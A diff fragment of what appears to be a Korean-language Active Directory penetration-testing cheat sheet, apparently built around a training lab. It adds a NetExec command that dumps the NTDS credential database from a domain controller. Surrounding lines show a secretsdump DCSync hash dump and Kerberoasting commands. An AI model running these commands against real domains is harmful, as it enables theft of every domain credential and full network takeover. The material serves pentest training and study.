@@ -501,6 +501,8 @@ Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfre
 > 원격으로 도메인 자격증명 덤프
 
 ```bash
+nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
+
 # DC로부터 모든 해시 덤프 (DCSync 권한 필요)
 secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
 ```
